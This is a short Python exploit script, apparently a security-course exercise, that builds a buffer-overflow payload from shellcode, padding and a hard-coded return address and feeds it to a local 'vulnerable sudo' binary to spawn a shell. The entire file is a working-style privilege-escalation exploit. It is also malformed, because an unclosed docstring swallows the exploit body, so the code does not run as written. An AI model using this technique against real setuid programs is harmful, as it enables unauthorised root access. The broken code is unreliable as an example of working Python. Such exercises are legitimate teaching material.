import os
import sys
from infosec.core import assemble


def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.
    OFFSET_TO_RETURN_ADDRESS = 67 # value Y
    BUFFER_ADDRESS = 0xbfffdfd9   # value X

    shellcode = assemble.assemble_file("./shellcode.asm")

    if len(shellcode) > OFFSET_TO_RETURN_ADDRESS:
        raise ValueError("Shellcode is too long")

    padding = b"A" * (OFFSET_TO_RETURN_ADDRESS - len(shellcode))
    return_address = BUFFER_ADDRESS.to_bytes(4, "little")
    payload = shellcode + padding + return_address
    os.execl(
        path_to_sudo,
        path_to_sudo,
        payload,
        b"/bin/sh",)
  

def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
